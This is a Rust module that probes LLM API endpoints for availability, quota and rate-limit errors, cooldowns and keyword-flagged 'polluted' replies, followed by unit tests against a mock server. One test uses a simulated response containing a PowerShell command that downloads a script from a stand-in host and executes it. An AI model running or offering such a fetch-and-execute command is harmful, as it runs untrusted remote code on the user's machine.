use crate::config::{AppConfig, EndpointConfig};
use crate::cooldown::cooldown_seconds_from_text;
use crate::pollution::{is_keyword_polluted_text, pollution_detection_configured};
use crate::probe::ProbeResult;
use crate::tokens::{extract_token_usage, model_probe_price_score, normalize_model_id_for_price};
use anyhow::Result;
use chrono::Utc;
use parking_lot::Mutex;
use reqwest::{header::RETRY_AFTER, Client, StatusCode};
use serde_json::{json, Value};
use std::collections::HashMap;
use std::sync::Arc;
use std::time::Duration;

type ModelCache = Arc<Mutex<HashMap<(String, String), Vec<String>>>>;

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ModelsResult {
    pub models: Vec<String>,
    pub status_code: Option<u16>,
    pub retry_after_seconds: Option<u64>,
    pub request_made: bool,
    pub error: String,
}

impl ModelsResult {
    pub fn empty(error: impl Into<String>) -> Self {
        Self {
            models: Vec::new(),
            status_code: None,
            retry_after_seconds: None,
            request_made: true,
            error: error.into(),
        }
    }
}

#[derive(Clone)]
pub struct HttpProbe {
    client: Client,
    model_cache: ModelCache,
}

impl HttpProbe {
    pub fn new(timeout_seconds: f64) -> Result<Self> {
        let client = Client::builder()
            .timeout(Duration::from_secs_f64(timeout_seconds.max(0.1)))
            .build()?;
        Ok(Self {
            client,
            model_cache: Arc::new(Mutex::new(HashMap::new())),
        })
    }

    pub async fn probe_all(&self, config: &AppConfig) -> HashMap<String, ProbeResult> {
        let mut handles = Vec::new();
        for endpoint in config.endpoints.iter().filter(|endpoint| endpoint.enabled) {
            let endpoint = endpoint.clone();
            let config = config.clone();
            let probe = self.clone();
            handles.push(tokio::spawn(async move {
                let result = probe.probe_endpoint(&endpoint, &config).await;
                (endpoint.name.clone(), result)
            }));
        }

        let mut results = HashMap::new();
        for handle in handles {
            match handle.await {
                Ok((name, result)) => {
                    results.insert(name, result);
                }
                Err(err) => {
                    results.insert(
                        "unknown".to_string(),
                        ProbeResult {
                            available: false,
                            request_made: true,
                            error: short_error(&err.to_string()),
                            ..Default::default()
                        },
                    );
                }
            }
        }
        results
    }

    pub async fn probe_endpoint(
        &self,
        endpoint: &EndpointConfig,
        config: &AppConfig,
    ) -> ProbeResult {
        let models = self.get_available_models(endpoint).await;
        let model = choose_cheapest_probe_model(&endpoint.model, &models);
        let payload = json!({
            "model": model,
            "input": format!("Reply with exactly {}. No extra text.", config.probe_expected_text),
            "max_output_tokens": 16,
            "store": false
        });
        let response = self
            .client
            .post(probe_url(endpoint, &config.probe_path))
            .bearer_auth(&endpoint.api_key)
            .json(&payload)
            .send()
            .await;

        let response = match response {
            Ok(response) => response,
            Err(err) => {
                return ProbeResult {
                    available: false,
                    request_made: true,
                    error: short_error(&err.to_string()),
                    ..Default::default()
                };
            }
        };
        let status = response.status();
        let status_code = Some(status.as_u16());
        let retry_after_seconds = retry_after_seconds_from_headers(response.headers());
        let text = match response.text().await {
            Ok(text) => text,
            Err(err) => {
                return ProbeResult {
                    available: false,
                    request_made: true,
                    status_code,
                    error: short_error(&err.to_string()),
                    ..Default::default()
                };
            }
        };
        let payload: Value = match serde_json::from_str(&text) {
            Ok(payload) => payload,
            Err(_) => {
                return ProbeResult {
                    available: false,
                    request_made: true,
                    status_code,
                    error: "响应不是 JSON".to_string(),
                    ..Default::default()
                };
            }
        };
        let mut result = probe_response_is_acceptable(&payload, endpoint, config);
        result.status_code = status_code;
        if !status.is_success() && result.available {
            result.available = false;
        }
        if !status.is_success() && !result.polluted {
            if status == StatusCode::TOO_MANY_REQUESTS || is_quota_limited_payload(&payload) {
                result.quota_limited = true;
            }
            result.retry_after_seconds =
                retry_after_seconds.or_else(|| key_switch_cooldown_seconds(&payload));
            result.error = http_error_text(status.as_u16(), &payload);
        }
        result
    }

    pub async fn probe_models_endpoint(&self, endpoint: &EndpointConfig) -> ProbeResult {
        let result = self.refresh_available_models_result(endpoint).await;
        let matched = result
            .models
            .iter()
            .any(|model| model_id_matches(&endpoint.model, model));
        ProbeResult {
            available: matched,
            status_code: result.status_code,
            retry_after_seconds: result.retry_after_seconds,
            request_made: result.request_made,
            error: if matched {
                String::new()
            } else if result.error.is_empty() {
                format!("models 无 {}", endpoint.model)
            } else {
                result.error
            },
            ..Default::default()
        }
    }

    pub async fn get_available_models(&self, endpoint: &EndpointConfig) -> Vec<String> {
        self.get_available_models_result(endpoint).await.models
    }

    pub async fn get_available_models_result(&self, endpoint: &EndpointConfig) -> ModelsResult {
        self.get_available_models_result_inner(endpoint, true).await
    }

    async fn refresh_available_models_result(&self, endpoint: &EndpointConfig) -> ModelsResult {
        self.get_available_models_result_inner(endpoint, false)
            .await
    }

    async fn get_available_models_result_inner(
        &self,
        endpoint: &EndpointConfig,
        use_cache: bool,
    ) -> ModelsResult {
        let cache_key = (
            endpoint.base_url.trim_end_matches('/').to_string(),
            endpoint.api_key.clone(),
        );
        if use_cache {
            if let Some(models) = self.model_cache.lock().get(&cache_key).cloned() {
                return ModelsResult {
                    models,
                    status_code: None,
                    retry_after_seconds: None,
                    request_made: false,
                    error: String::new(),
                };
            }
        }

        let response = self
            .client
            .get(models_url(endpoint))
            .bearer_auth(&endpoint.api_key)
            .send()
            .await;
        let response = match response {
            Ok(response) => response,
            Err(err) => {
                return ModelsResult {
                    models: Vec::new(),
                    status_code: None,
                    retry_after_seconds: None,
                    request_made: true,
                    error: short_error(&err.to_string()),
                };
            }
        };
        let status = response.status();
        let status_code = Some(status.as_u16());
        let retry_after_seconds = retry_after_seconds_from_headers(response.headers());
        let raw = match response.text().await {
            Ok(text) => text,
            Err(err) => {
                return ModelsResult {
                    models: Vec::new(),
                    status_code,
                    retry_after_seconds,
                    request_made: true,
                    error: short_error(&err.to_string()),
                };
            }
        };
        let payload: Value = match serde_json::from_str(&raw) {
            Ok(payload) => payload,
            Err(_) => {
                return ModelsResult {
                    models: Vec::new(),
                    status_code,
                    retry_after_seconds,
                    request_made: true,
                    error: "models 不是 JSON".to_string(),
                };
            }
        };
        if !status.is_success() {
            self.model_cache.lock().remove(&cache_key);
            return ModelsResult {
                models: Vec::new(),
                status_code,
                retry_after_seconds: retry_after_seconds
                    .or_else(|| key_switch_cooldown_seconds(&payload)),
                request_made: true,
                error: http_error_text(status.as_u16(), &payload),
            };
        }

        let models = extract_model_ids(&payload);
        if !models.is_empty() {
            self.model_cache.lock().insert(cache_key, models.clone());
        } else {
            self.model_cache.lock().remove(&cache_key);
        }
        ModelsResult {
            error: if models.is_empty() {
                "models 为空".to_string()
            } else {
                String::new()
            },
            models,
            status_code,
            retry_after_seconds: None,
            request_made: true,
        }
    }
}

fn retry_after_seconds_from_headers(headers: &reqwest::header::HeaderMap) -> Option<u64> {
    let value = headers.get(RETRY_AFTER)?.to_str().ok()?.trim();
    if let Ok(seconds) = value.parse::<u64>() {
        return Some(seconds);
    }
    let retry_at = chrono::DateTime::parse_from_rfc2822(value).ok()?;
    let seconds = retry_at
        .with_timezone(&Utc)
        .signed_duration_since(Utc::now())
        .num_seconds()
        .max(0) as u64;
    Some(seconds)
}

pub fn extract_model_ids(payload: &Value) -> Vec<String> {
    payload
        .get("data")
        .and_then(Value::as_array)
        .into_iter()
        .flatten()
        .filter_map(|item| item.get("id").and_then(Value::as_str))
        .map(str::trim)
        .filter(|item| !item.is_empty())
        .map(str::to_string)
        .collect()
}

pub fn choose_cheapest_probe_model(configured_model: &str, available_models: &[String]) -> String {
    let mut priced: Vec<(f64, &str)> = available_models
        .iter()
        .filter_map(|model| model_probe_price_score(model).map(|score| (score, model.as_str())))
        .collect();
    if priced.is_empty() {
        return configured_model.to_string();
    }
    priced.sort_by(|left, right| left.0.total_cmp(&right.0).then_with(|| left.1.cmp(right.1)));
    priced[0].1.to_string()
}

pub fn model_id_matches(configured_model: &str, available_model: &str) -> bool {
    let configured = normalize_model_id_for_price(configured_model);
    let available = normalize_model_id_for_price(available_model);
    !configured.is_empty() && configured == available
}

pub fn probe_response_is_acceptable(
    payload: &Value,
    endpoint: &EndpointConfig,
    config: &AppConfig,
) -> ProbeResult {
    let usage = extract_token_usage(payload);
    let text = extract_response_text(payload).trim().to_string();
    let pollution_text = if text.is_empty() {
        extract_error_message_text(payload)
    } else {
        text.clone()
    };
    let use_direct_pollution_detection =
        !endpoint.guard_proxy.enabled || !endpoint.guard_proxy.replace_direct_pollution_detection;
    if use_direct_pollution_detection
        && pollution_detection_configured(&config.polluted_response_keywords)
        && is_keyword_polluted_text(
            &pollution_text,
            &config.polluted_response_keywords,
            config.polluted_response_threshold,
            config.polluted_context_window,
            config.polluted_check_max_chars,
        )
    {
        return ProbeResult {
            available: false,
            polluted: true,
            usage,
            request_made: true,
            ..Default::default()
        };
    }
    if is_quota_limited_payload(payload) {
        return ProbeResult {
            available: false,
            quota_limited: true,
            usage,
            request_made: true,
            ..Default::default()
        };
    }
    ProbeResult {
        available: text.contains(&config.probe_expected_text),
        usage,
        request_made: true,
        ..Default::default()
    }
}

pub fn extract_response_text(payload: &Value) -> String {
    if let Some(text) = payload.get("output_text").and_then(Value::as_str) {
        return text.to_string();
    }

    if let Some(output) = payload.get("output").and_then(Value::as_array) {
        let mut chunks = Vec::new();
        for item in output {
            if let Some(content) = item.get("content").and_then(Value::as_array) {
                chunks.extend(content_texts(content));
            }
        }
        if !chunks.is_empty() {
            return chunks.join("");
        }
    }

    if let Some(first) = payload
        .get("choices")
        .and_then(Value::as_array)
        .and_then(|items| items.first())
    {
        if let Some(text) = first
            .get("message")
            .and_then(|message| message.get("content"))
            .and_then(Value::as_str)
        {
            return text.to_string();
        }
        if let Some(text) = first.get("text").and_then(Value::as_str) {
            return text.to_string();
        }
    }

    String::new()
}

pub fn extract_error_message_text(payload: &Value) -> String {
    fn visit(value: &Value, key: &str, messages: &mut Vec<String>) {
        match value {
            Value::String(text) => {
                if matches!(key, "message" | "detail" | "text" | "content" | "error") {
                    messages.push(text.clone());
                }
            }
            Value::Object(map) => {
                for (child_key, child) in map {
                    visit(child, &child_key.to_ascii_lowercase(), messages);
                }
            }
            Value::Array(items) => {
                for item in items {
                    visit(item, key, messages);
                }
            }
            _ => {}
        }
    }
    let mut messages = Vec::new();
    visit(payload, "", &mut messages);
    messages.join(" ")
}

pub fn is_quota_limited_payload(payload: &Value) -> bool {
    let text = payload_strings_text(payload).to_ascii_lowercase();
    if text.is_empty() {
        return false;
    }
    quota_keywords()
        .iter()
        .any(|keyword| text.contains(&keyword.to_ascii_lowercase()))
}

pub fn key_switch_cooldown_seconds(payload: &Value) -> Option<u64> {
    key_switch_cooldown_seconds_from_text(&payload_strings_text(payload))
}

fn key_switch_cooldown_seconds_from_text(text: &str) -> Option<u64> {
    cooldown_seconds_from_text(text, 10)
}

pub fn probe_url(endpoint: &EndpointConfig, probe_path: &str) -> String {
    if let Some(url) = &endpoint.probe_url {
        return url.clone();
    }
    let base = endpoint.base_url.trim_end_matches('/');
    let path = format!("/{}", probe_path.trim_matches('/'));
    if base.ends_with("/v1") && path == "/v1/responses" {
        return format!("{base}/responses");
    }
    format!("{base}{path}")
}

pub fn models_url(endpoint: &EndpointConfig) -> String {
    let base = endpoint.base_url.trim_end_matches('/');
    if base.ends_with("/v1") {
        format!("{base}/models")
    } else {
        format!("{base}/v1/models")
    }
}

fn content_texts(content_items: &[Value]) -> Vec<String> {
    content_items
        .iter()
        .filter_map(|content| content.get("text").and_then(Value::as_str))
        .map(str::to_string)
        .collect()
}

fn payload_strings_text(value: &Value) -> String {
    let mut out = String::new();
    walk_payload_strings(value, &mut out);
    out
}

fn push_payload_string(out: &mut String, text: &str) {
    if !out.is_empty() {
        out.push(' ');
    }
    out.push_str(text);
}

fn walk_payload_strings(value: &Value, out: &mut String) {
    match value {
        Value::String(text) => push_payload_string(out, text),
        Value::Object(map) => {
            for (key, child) in map {
                push_payload_string(out, key);
                walk_payload_strings(child, out);
            }
        }
        Value::Array(items) => {
            for child in items {
                walk_payload_strings(child, out);
            }
        }
        _ => {}
    }
}

fn quota_keywords() -> &'static [&'static str] {
    &[
        "余额",
        "额度",
        "配额",
        "欠费",
        "充值",
        "订阅",
        "无可用额度",
        "账户余额不足",
        "insufficient_quota",
        "insufficient quota",
        "insufficient balance",
        "quota exceeded",
        "quota_exceeded",
        "billing",
        "hard limit",
        "payment required",
        "subscription_not_found",
        "no active subscription",
        "credit balance",
        "usage_limit_exceeded",
        "daily_limit_exceeded",
        "daily usage limit",
        "rate limit",
        "rate_limit",
    ]
}

fn http_error_text(status_code: u16, payload: &Value) -> String {
    let detail = extract_error_message_text(payload);
    if detail.trim().is_empty() {
        format!("HTTP {status_code}")
    } else {
        let short: String = detail.chars().take(80).collect();
        format!("HTTP {status_code} {short}")
    }
}

fn short_error(text: &str) -> String {
    let lowered = text.to_ascii_lowercase();
    if lowered.contains("timed out") || lowered.contains("timeout") {
        return "超时".to_string();
    }
    if lowered.contains("certificate") || lowered.contains("ssl") || lowered.contains("tls") {
        return "TLS/证书错误".to_string();
    }
    if lowered.contains("dns") || lowered.contains("getaddrinfo") || lowered.contains("nodename") {
        return "DNS 失败".to_string();
    }
    if lowered.contains("refused") {
        return "连接被拒绝".to_string();
    }
    if lowered.contains("proxy") {
        return "代理错误".to_string();
    }
    if text.is_empty() {
        return "请求失败".to_string();
    }
    text.chars().take(120).collect()
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::config::{AgentCommand, AgentDriver};
    use serde_json::json;
    use std::io::{Read, Write};
    use std::net::{TcpListener, TcpStream};
    use std::path::PathBuf;
    use std::sync::atomic::{AtomicUsize, Ordering};
    use std::sync::Arc as StdArc;
    use std::thread;

    fn endpoint(base_url: String) -> EndpointConfig {
        EndpointConfig {
            name: "primary".to_string(),
            base_url,
            api_key: "key".to_string(),
            model: "gpt-test".to_string(),
            reasoning_effort: "high".to_string(),
            service_tier: None,
            initial_prompt: "bootstrap".to_string(),
            auto_prompt: "continue".to_string(),
            workdir: PathBuf::from("."),
            weight: 100,
            enabled: true,
            probe_url: None,
            guard_proxy: Default::default(),
        }
    }

    fn config(endpoint: EndpointConfig) -> AppConfig {
        AppConfig {
            agent_id: "default".to_string(),
            endpoints: vec![endpoint],
            config_path: None,
            workdir: PathBuf::from("."),
            continuation_mode: crate::config::ContinuationMode::Auto,
            agent_goal: Default::default(),
            probe_interval_seconds: 1.0,
            healthy_probe_interval_seconds: 300.0,
            polluted_endpoint_cooldown_seconds: 300.0,
            request_timeout_seconds: 2.0,
            idle_seconds: 3.0,
            inflight_idle_fallback_seconds: 60.0,
            turn_stall_seconds: 180.0,
            turn_stall_failure_threshold: 1,
            transient_network_failure_threshold: 3,
            min_prompt_interval_seconds: 1.0,
            prompt_submit_sequence: "control-m".to_string(),
            prompt_submit_retry_seconds: 5.0,
            endpoint_failure_threshold: 1,
            endpoint_recovery_threshold: 1,
            agent_driver: AgentDriver::Codex,
            agent_command: AgentCommand::Args(vec!["codex".to_string()]),
            agent_home: None,
            codex_config_path: PathBuf::from("config.toml"),
            codex_auth_path: PathBuf::from("auth.json"),
            codex_home: PathBuf::from(".codex"),
            session_state_path: PathBuf::from(".watchapi-state.json"),
            restore_sessions: true,
            codex_provider_name: "custom".to_string(),
            probe_expected_text: "WATCHAPI_OK".to_string(),
            probe_path: "/v1/responses".to_string(),
            polluted_response_keywords: vec![],
            polluted_response_threshold: 0.35,
            polluted_context_window: 12,
            polluted_check_max_chars: 300,
            completion_pause_keywords: vec![],
        }
    }

    #[test]
    fn extracts_response_text_from_responses_shapes() {
        assert_eq!(
            extract_response_text(&json!({"output_text": "WATCHAPI_OK"})),
            "WATCHAPI_OK"
        );
        assert_eq!(
            extract_response_text(
                &json!({"output": [{"content": [{"type": "output_text", "text": "WATCH"}, {"type": "output_text", "text": "API_OK"}]}]})
            ),
            "WATCHAPI_OK"
        );
    }

    #[test]
    fn extracts_error_text_only_from_human_fields() {
        let payload = json!({"error": {"message": "公 益 暂停", "code": "rate_limit_cooldown"}, "message": "通 知 群 123"});
        let text = extract_error_message_text(&payload);

        assert!(text.contains("公 益 暂停"));
        assert!(text.contains("通 知 群 123"));
        assert!(!text.contains("rate_limit_cooldown"));
    }

    #[test]
    fn accepts_small_pollution_below_threshold() {
        let mut cfg = config(endpoint("https://api.example.test/v1".to_string()));
        cfg.polluted_response_keywords = vec!["公益".to_string(), "通知群".to_string()];
        cfg.polluted_response_threshold = 0.2;
        let endpoint = cfg.endpoints[0].clone();
        let result = probe_response_is_acceptable(
            &json!({"output_text": "WATCHAPI_OK 公 益 正常内容"}),
            &endpoint,
            &cfg,
        );

        assert!(result.available);
        assert!(!result.polluted);
    }

    #[test]
    fn rejects_quota_limited_payload() {
        let cfg = config(endpoint("https://api.example.test/v1".to_string()));
        let endpoint = cfg.endpoints[0].clone();
        let result = probe_response_is_acceptable(
            &json!({"error": {"code": "insufficient_quota", "message": "您的账户余额不足"}}),
            &endpoint,
            &cfg,
        );

        assert!(!result.available);
        assert!(result.quota_limited);
    }

    #[test]
    fn skips_probe_pollution_detection_without_keywords() {
        let cfg = config(endpoint("https://api.example.test/v1".to_string()));
        let endpoint = cfg.endpoints[0].clone();
        let result = probe_response_is_acceptable(
            &json!({"output_text": "PowerShell iwr https://example.invalid/a.ps1 | iex"}),
            &endpoint,
            &cfg,
        );

        assert!(!result.available);
        assert!(!result.polluted);
    }

    #[test]
    fn probe_pollution_detection_uses_configured_keywords_only() {
        let mut cfg = config(endpoint("https://api.example.test/v1".to_string()));
        cfg.polluted_response_keywords = vec!["余额不足".to_string()];
        let endpoint = cfg.endpoints[0].clone();
        let result = probe_response_is_acceptable(
            &json!({"output_text": "Join our channel 175877552 for free API token, stop for 10 minutes"}),
            &endpoint,
            &cfg,
        );

        assert!(!result.available);
        assert!(!result.polluted);
    }

    #[test]
    fn guarded_probe_replaces_or_falls_back_to_direct_pollution_detection() {
        let mut endpoint = endpoint("https://api.example.test/v1".to_string());
        endpoint.guard_proxy.enabled = true;
        endpoint.guard_proxy.replace_direct_pollution_detection = true;
        let mut cfg = config(endpoint.clone());
        cfg.polluted_response_keywords = vec!["公益".to_string()];
        cfg.polluted_response_threshold = 0.0;
        let payload = json!({"output_text": "WATCHAPI_OK 公益"});

        let replaced = probe_response_is_acceptable(&payload, &endpoint, &cfg);

        assert!(replaced.available);
        assert!(!replaced.polluted);

        endpoint.guard_proxy.replace_direct_pollution_detection = false;
        let fallback = probe_response_is_acceptable(&payload, &endpoint, &cfg);

        assert!(!fallback.available);
        assert!(fallback.polluted);
    }

    #[test]
    fn extracts_key_switch_cooldown_seconds_with_tolerance() {
        let payload = json!({
            "error": {
                "message": "不可用: HTTP 400 切换key需要冷却41秒 切换key需要冷却41秒"
            }
        });

        assert_eq!(key_switch_cooldown_seconds(&payload), Some(51));
    }

    #[test]
    fn extracts_rate_limit_cooldown_seconds_with_tolerance() {
        let payload = json!({
            "error": {
                "message": "一分钟30次，冷却20秒",
                "code": "rate_limit_cooldown",
                "limit_type": "cooldown"
            }
        });

        assert_eq!(key_switch_cooldown_seconds(&payload), Some(30));
    }

    #[test]
    fn extracts_retry_after_header_seconds() {
        let mut headers = reqwest::header::HeaderMap::new();
        headers.insert(RETRY_AFTER, reqwest::header::HeaderValue::from_static("20"));

        assert_eq!(retry_after_seconds_from_headers(&headers), Some(20));
    }

    #[test]
    fn extracts_retry_after_header_http_date() {
        let retry_at = Utc::now() + chrono::Duration::seconds(30);
        let mut headers = reqwest::header::HeaderMap::new();
        headers.insert(
            RETRY_AFTER,
            reqwest::header::HeaderValue::from_str(&retry_at.to_rfc2822()).unwrap(),
        );

        assert!(matches!(
            retry_after_seconds_from_headers(&headers),
            Some(0..=31)
        ));
    }

    #[test]
    fn ignores_seconds_without_cooldown_keyword() {
        let payload = json!({"error": {"message": "普通错误 41秒后无关"}});

        assert_eq!(key_switch_cooldown_seconds(&payload), None);
    }

    #[test]
    fn choose_cheapest_probe_model_uses_price_table() {
        let model = choose_cheapest_probe_model(
            "gpt-5.5",
            &[
                "gpt-5.5".to_string(),
                "gpt-5.4".to_string(),
                "gpt-5.4-mini".to_string(),
                "gemini-2.0-flash-lite".to_string(),
            ],
        );

        assert_eq!(model, "gemini-2.0-flash-lite");
    }

    #[test]
    fn models_url_handles_v1_base_url() {
        let endpoint = endpoint("http://127.0.0.1:8787/v1".to_string());

        assert_eq!(models_url(&endpoint), "http://127.0.0.1:8787/v1/models");
        assert_eq!(
            probe_url(&endpoint, "/v1/responses"),
            "http://127.0.0.1:8787/v1/responses"
        );
    }

    #[tokio::test]
    async fn probe_endpoint_reports_success_status_code_and_caches_models() {
        let counter = StdArc::new(AtomicUsize::new(0));
        let server = MockServer::start({
            let counter = StdArc::clone(&counter);
            move |path, _body| {
                if path == "/v1/models" {
                    counter.fetch_add(1, Ordering::SeqCst);
                    return (200, json!({"data": [{"id": "gpt-test"}]}));
                }
                if path == "/v1/responses" {
                    return (200, json!({"output_text": "WATCHAPI_OK"}));
                }
                (404, json!({"error": "not found"}))
            }
        });
        let endpoint = endpoint(format!("{}/v1", server.url()));
        let cfg = config(endpoint.clone());
        let probe = HttpProbe::new(2.0).unwrap();

        let first = probe.probe_endpoint(&endpoint, &cfg).await;
        let second_models = probe.get_available_models_result(&endpoint).await;

        assert!(first.available);
        assert_eq!(first.status_code, Some(200));
        assert!(!second_models.request_made);
        assert_eq!(counter.load(Ordering::SeqCst), 1);
    }

    #[tokio::test]
    async fn probe_models_endpoint_does_not_post_generation_request() {
        let post_count = StdArc::new(AtomicUsize::new(0));
        let server = MockServer::start({
            let post_count = StdArc::clone(&post_count);
            move |path, _body| {
                if path == "/v1/models" {
                    return (200, json!({"data": [{"id": "gpt-test"}]}));
                }
                if path == "/v1/responses" {
                    post_count.fetch_add(1, Ordering::SeqCst);
                    return (500, json!({"error": "models-only probe should not post"}));
                }
                (404, json!({"error": "not found"}))
            }
        });
        let endpoint = endpoint(server.url());
        let probe = HttpProbe::new(2.0).unwrap();

        let result = probe.probe_models_endpoint(&endpoint).await;

        assert!(result.available);
        assert_eq!(result.status_code, Some(200));
        assert_eq!(post_count.load(Ordering::SeqCst), 0);
    }

    #[tokio::test]
    async fn probe_models_endpoint_refreshes_stale_model_cache() {
        let models_count = StdArc::new(AtomicUsize::new(0));
        let server = MockServer::start({
            let models_count = StdArc::clone(&models_count);
            move |path, _body| {
                if path == "/v1/models" {
                    let count = models_count.fetch_add(1, Ordering::SeqCst);
                    if count == 0 {
                        return (200, json!({"data": [{"id": "gpt-test"}]}));
                    }
                    return (500, json!({"error": {"message": "down"}}));
                }
                if path == "/v1/responses" {
                    return (200, json!({"output_text": "WATCHAPI_OK"}));
                }
                (404, json!({"error": "not found"}))
            }
        });
        let endpoint = endpoint(format!("{}/v1", server.url()));
        let cfg = config(endpoint.clone());
        let probe = HttpProbe::new(2.0).unwrap();

        let first = probe.probe_endpoint(&endpoint, &cfg).await;
        let refreshed = probe.probe_models_endpoint(&endpoint).await;

        assert!(first.available);
        assert!(!refreshed.available);
        assert!(refreshed.request_made);
        assert_eq!(refreshed.status_code, Some(500));
        assert_eq!(models_count.load(Ordering::SeqCst), 2);
    }

    #[tokio::test]
    async fn probe_models_endpoint_preserves_cooldown_seconds() {
        let server = MockServer::start(|path, _body| {
            if path == "/v1/models" {
                return (
                    429,
                    json!({"message": "一分钟30次，冷却20秒", "code": "cooldown", "limit_type": "cooldown"}),
                );
            }
            (404, json!({"error": "not found"}))
        });
        let endpoint = endpoint(format!("{}/v1", server.url()));
        let probe = HttpProbe::new(2.0).unwrap();

        let result = probe.probe_models_endpoint(&endpoint).await;

        assert!(!result.available);
        assert_eq!(result.status_code, Some(429));
        assert_eq!(result.retry_after_seconds, Some(30));
    }

    #[tokio::test]
    async fn probe_endpoint_marks_polluted_http_error_before_quota() {
        let server = MockServer::start(|path, _body| {
            if path == "/v1/models" {
                return (200, json!({"data": [{"id": "gpt-test"}]}));
            }
            (
                400,
                json!({"error": {"message": "公 益 暂停，通 知 群 123", "code": "rate_limit_cooldown"}}),
            )
        });
        let endpoint = endpoint(format!("{}/v1", server.url()));
        let mut cfg = config(endpoint.clone());
        cfg.polluted_response_keywords = vec!["公益".to_string(), "通知群".to_string()];
        cfg.polluted_response_threshold = 0.35;
        let probe = HttpProbe::new(2.0).unwrap();

        let result = probe.probe_endpoint(&endpoint, &cfg).await;

        assert!(!result.available);
        assert!(result.polluted);
        assert!(!result.quota_limited);
        assert_eq!(result.status_code, Some(400));
    }

    struct MockServer {
        addr: String,
    }

    impl MockServer {
        fn start<F>(handler: F) -> Self
        where
            F: Fn(&str, &[u8]) -> (u16, Value) + Send + Sync + 'static,
        {
            let listener = TcpListener::bind("127.0.0.1:0").unwrap();
            let addr = listener.local_addr().unwrap();
            let handler = StdArc::new(handler);
            thread::spawn(move || {
                for stream in listener.incoming().flatten() {
                    let handler = StdArc::clone(&handler);
                    thread::spawn(move || handle_connection(stream, handler));
                }
            });
            Self {
                addr: format!("http://{addr}"),
            }
        }

        fn url(&self) -> String {
            self.addr.clone()
        }
    }

    fn handle_connection<F>(mut stream: TcpStream, handler: StdArc<F>)
    where
        F: Fn(&str, &[u8]) -> (u16, Value),
    {
        let mut buffer = [0_u8; 16384];
        let Ok(size) = stream.read(&mut buffer) else {
            return;
        };
        let request = String::from_utf8_lossy(&buffer[..size]);
        let mut lines = request.lines();
        let request_line = lines.next().unwrap_or_default();
        let path = request_line.split_whitespace().nth(1).unwrap_or("/");
        let body_start = request
            .find("\r\n\r\n")
            .map(|index| index + 4)
            .unwrap_or(size);
        let body = if body_start <= size {
            &buffer[body_start..size]
        } else {
            &[]
        };
        let (status, payload) = handler(path, body);
        let data = serde_json::to_vec(&payload).unwrap();
        let reason = if status == 200 { "OK" } else { "ERR" };
        let response = format!(
            "HTTP/1.1 {status} {reason}\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n",
            data.len()
        );
        let _ = stream.write_all(response.as_bytes());
        let _ = stream.write_all(&data);
    }
}
